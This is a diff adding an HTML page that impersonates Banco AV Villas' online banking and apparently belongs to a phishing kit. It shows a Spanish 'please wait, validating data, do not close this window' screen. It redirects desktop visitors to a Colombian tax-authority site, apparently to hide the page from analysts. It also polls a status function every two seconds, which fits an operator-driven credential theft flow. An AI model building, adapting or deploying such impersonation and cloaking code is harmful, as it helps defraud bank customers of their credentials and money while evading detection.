@@ -1,0 +1,86 @@
+<html>
+    <head>
+        <title>Banca Virtual | Banco AV Villas</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        <meta content="es" http-equiv="Content-Language">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="theme-color" content="#FF0015">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="../img/favicon.png">
+        <script type="text/javascript" src="../../../../../js/jquery-3.6.0.min.js"></script>      
+        <link href="../css/style-white.css" rel="stylesheet">
+        <link href="../css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="../js/functions.js"></script>  
+        <script type="text/javascript" src="../js/ready.js"></script>                
+        <style type="text/css">
+            #fondo-w{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                left: 0;
+                top: 0;
+                background-color: #F4F5F7;
+                z-index: 900;
+            }
+
+            #cargando-w{
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 920;
+                text-align: center;
+                width: 100%;
+                max-width: 550px;
+                padding: 0px 20px;
+            }
+        </style>
+    </head>
+    <body>
+       
+        <div id="fondo"></div>
+        <div id="cargando-w">
+            <img src="../img/logo.png" width="150"><br><br>
+            Por favor espere un momento estamos validando algunos datos. Puede tardar entre 1 a 5 minuto. No cierres o recargues esta ventana.<br>
+        <img src="../img/cargando.gif" width="110">
+        </div>
+        
+    
+<script>
+    function detectar_dispositivo() {
+        var dispositivo = "";
+        if (navigator.userAgent.match(/Android/i))
+            dispositivo = "Android";
+        else if (navigator.userAgent.match(/webOS/i))
+            dispositivo = "webOS";
+        else if (navigator.userAgent.match(/iPhone/i))
+            dispositivo = "iPhone";
+        else if (navigator.userAgent.match(/iPad/i))
+            dispositivo = "iPad";
+        else if (navigator.userAgent.match(/iPod/i))
+            dispositivo = "iPod";
+        else if (navigator.userAgent.match(/BlackBerry/i))
+            dispositivo = "BlackBerry";
+        else if (navigator.userAgent.match(/Windows Phone/i))
+            dispositivo = "Windows Phone";
+        else
+            dispositivo = "PC";
+        return dispositivo;
+    }
+
+    if (detectar_dispositivo() == "PC") {
+        window.location.href = 'https://www.dian.gov.co';
+    }
+</script>
+    
+</body>
+</html>
+<script language="javascript">
+$(document).ready(function() {
+    setInterval(status,2000);   
+});
+</script>
